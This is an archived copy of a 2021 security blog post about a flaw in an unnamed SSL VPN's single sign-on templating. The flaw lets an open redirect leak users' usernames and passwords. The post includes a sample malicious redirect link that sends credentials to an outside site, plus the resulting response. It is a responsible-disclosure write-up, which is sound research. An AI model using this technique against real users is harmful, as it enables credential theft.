---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-25_stealing-user-passwords-through-a-vpns-sso.md
original_filename: 2021-02-25_stealing-user-passwords-through-a-vpns-sso.md
title: Stealing user passwords through a VPN’s SSO
category: documents
detected_topics:
- oauth
- sso
- saml
- command-injection
- api-security
- cloud-security
tags:
- imported
- documents
- oauth
- sso
- saml
- command-injection
- api-security
- cloud-security
language: en
raw_sha256: 9a14b393d4ce9b27af6f88f348277232fa78dbc337d4e5e5fbf1d89726bfdc51
text_sha256: 2c98a68ec5b1ffe981302f6574d739f291cc45b8cda59682b0adb4d1c555f267
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: true
---

# Stealing user passwords through a VPN’s SSO

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-25_stealing-user-passwords-through-a-vpns-sso.md
- Source Type: markdown
- Detected Topics: oauth, sso, saml, command-injection, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: True
- Raw SHA256: `9a14b393d4ce9b27af6f88f348277232fa78dbc337d4e5e5fbf1d89726bfdc51`
- Text SHA256: `2c98a68ec5b1ffe981302f6574d739f291cc45b8cda59682b0adb4d1c555f267`


## Content

---
title: "Stealing user passwords through a VPN’s SSO"
page_title: "Stealing user passwords through a VPN’s SSO – SCRT Team Blog"
url: "https://blog.scrt.ch/2021/02/25/stealing-user-passwords-through-a-vpns-sso/"
final_url: "https://blog.scrt.ch/2021/02/25/stealing-user-passwords-through-a-vpns-sso/"
authors: ["Alain Mowat (@plopz0r)"]
bugs: ["Open redirect", "SSTI"]
publication_date: "2021-02-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3868
---

# Stealing user passwords through a VPN’s SSO

Last year I got this idea that I should attempt to pay for my holidays to Japan by hunting for bounties in security appliances while in the plane. A full 10 hours of uninterrupted focus on one solution seemed like it should yield interesting results. So I started reverse engineering the Firewall of a relatively common brand which has a private bug bounty. Due to this reason, I won’t be giving out the full details of the issue I discovered, but I find the vulnerability to be quite interesting and worth discussing. So I attempt to do this here without breaching any disclosure terms…

This happened relatively shortly after I had discovered some issues in [Sonicwall appliances](https://blog.scrt.ch/2020/02/11/sonicwall-sra-and-sma-vulnerabilties/) (there may well be more of them discussed here in the short future), so I was still investigating SSL VPNs and searching for ways to compromise them. 

One of the features that most SSL VPNs offer is the ability to provide single sign-on for internal applications once a user is authenticated to the VPN device. Unless a fancier protocol like OAuth2 or SAML is used, a VPN admin might be required to specify a URL that allows the user to “seamlessly” authenticate to the back-end server. This might look like the following:
  
  
  https://backendserver/login?username={{username}}&password=***REDACTED***

When the user attempts to access the back-end application, a templating engine will automatically replace the username and password with the user’s data and thus authenticate successfully with the back-end server.

In other cases, the back-end server might accept Basic, Digest, NTLM or other types of authentication, which could also be configured by a VPN admin. 

The first vulnerability I discovered was a pretty straightforward stack-based buffer overflow in the way the SSL VPN parsed the Negotiate authentication header. However, it was only exploitable from a back-end server. Worst case scenario, a server administrator (or any person who could tamper with internal communications) could potentially compromise the SSL VPN device. I wasn’t particularly enthusiastic about this finding as in practice, I didn’t really see many cases where I’d be able to exploit it. But I did continue researching how the device parsed these authentication headers in order to achieve single sign-on.

It turns out that the device did a pretty simple pattern match and replace on the `{{username}}` and `{{password}}` strings that were detected in the HTTP request. Where it got interesting, is when I noticed that these patterns were also replaced in the headers of the server’s Response for some reason. Not quite sure whether there is a legitimate reason to do so, or if this is an oversight, but I was wondering whether there was a way to exploit this in order to recover a user’s password.

Essentially, as an attacker we would need to find a way to get a specific pattern in the headers of the HTTP response from an application which is accessed through the VPN (even if no SSO is configured for it by the way). Unfortunately, I couldn’t find a generic way of doing so, but it is possible if one of the back-end applications is vulnerable to an [insecure redirect](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).

When exploiting such a vulnerability, an attacker has to convince a user to click on a malicious link which will redirect the user to another location. Unless it is done in JavaScript, the redirection is generally done with a `Location` HTTP header containing the new location to visit.

This is very convenient in our case, as it allows us to recover the user’s VPN password as long as we can achieve the two following things:

  * Know the location of an insecure redirect on any application accessed through the VPN
  * Convince an authenticated user to visit a maliciously prepared URL

For instance, if I can get a user to click on the following link:
  
  
  https://backendapp/redirect?url=https://www.scrt.ch/?user={{username}}&password=***REDACTED***

The user will end up visiting SCRT’s website while providing his or her username and password in the URL, since the browser will see the following response from the application.
  
  
  HTTP/1.1 302 Found
  Location: https://www.scrt.ch/?user=USER&password=***REDACTED***

Obviously this is not the most serious vulnerability to be discovered but I thought it was quite different from what I usually see and worth presenting quickly. There might be other devices out there vulnerable to similar flaws or templating issues.

Unfortunately, it’s only after I did the research and reported the various issues that I noticed that the bug bounty program was no longer issuing any rewards, so I wasn’t even close to paying for my trip.

Posted on [February 25, 2021January 12, 2023](/2021/02/25/stealing-user-passwords-through-a-vpns-sso/)Author [Alain Mowat](/author/alainmowat/)Categories [News](/category/news/), [Vulnerability](/category/vulnerability/)
